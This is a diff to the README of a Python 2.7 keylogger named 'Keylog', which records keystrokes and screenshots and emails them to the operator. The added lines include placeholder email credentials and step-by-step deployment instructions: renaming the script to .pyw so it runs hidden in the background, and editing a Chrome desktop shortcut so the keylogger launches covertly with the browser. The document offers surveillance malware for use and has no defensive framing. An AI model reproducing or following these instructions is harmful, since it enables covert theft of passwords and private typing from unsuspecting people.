@@ -2,7 +2,7 @@
 
 Introduction:
 --------------
-Keylog is created in python 2.7 with famous modules like pyHook and pythoncom. Kelog allow the user to listen to the keyboard events as well as mouse event. Keylog grab data by using keyboard and mouse event which then sent the data along with screenshots. Which are taken when the user press <Enter>, Mouse Click event or When the data is saved to the local directory called keystrokes.txt
+Keylog is created in python 2.7 with famous modules like pyHook and pythoncom. Kelog allow the user to listen to the keyboard events. Keylog grab data by using keyboard events which then sent the data along with screenshots. Which are taken when the user press <Enter> or When the data is saved to the local directory called keystrokes.txt
 
 
 Installation:
@@ -14,10 +14,20 @@ Usage:
 ------------------
 You would need to add your credentials where necessary. You would be asked to provide two separate emails. One in the host computer which sent the data to the other email (Your email).
 
+
+### Example:
+
+'''
+ 	   USER = 'yourFirstEmail@gmail.com'
+ 	   PASS = 'passw0rd'
+ 	   FROM = USER
+ 	   TO = 'yourSecondEmail@gmail.com'
+'''
+
 Optional: You can also attach the file with the chrome.exe file.
 
 Step 1:
-Open the run.bat file in your Text editor. Add the location of the main.pyw file and If you are using chrome 64 bit you might also have to changed the chrome location.
+Open the run.bat file in your Text editor. Add the location of the main.pyw (You need to change main.py to main.pyw So program runs in the background) file and If you are using chrome 64 bit you might also have to changed the chrome location.
 
 Step 2:
 Go to the properties of chrome icon in the desktop and change the Target to run the run.bat file. It will launch main.pyw file as well as chrome.exe.
